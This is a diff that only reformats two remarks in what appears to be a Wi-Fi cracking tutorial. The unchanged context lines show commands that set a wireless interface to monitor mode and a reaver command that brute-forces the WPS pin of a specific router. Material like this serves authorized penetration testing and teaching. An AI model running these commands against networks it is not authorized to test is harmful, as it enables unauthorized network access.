@@ -28,7 +28,7 @@ iwconfig wlan0 mode monitor
 ifconfig wlan0 up
 ```
 
-(The mode will be Monitor now)
+>The mode will be Monitor now
 
 - Sniffing on 5G and 2.4G networks and find the network with the cipher WEP
 ```bash
@@ -70,7 +70,7 @@ reaver --bssid 78:67:0E:31:4C:42 --channel 1 --interface wlan0 -vvv --no-associa
 ```
 
 - If Reaver finds the pin then the password will be available for the Wifi network. 
-(not all routers will be cracked with these steps)
+>Not all routers will be cracked with these steps.
 
 **Method for capturing handshake**
 
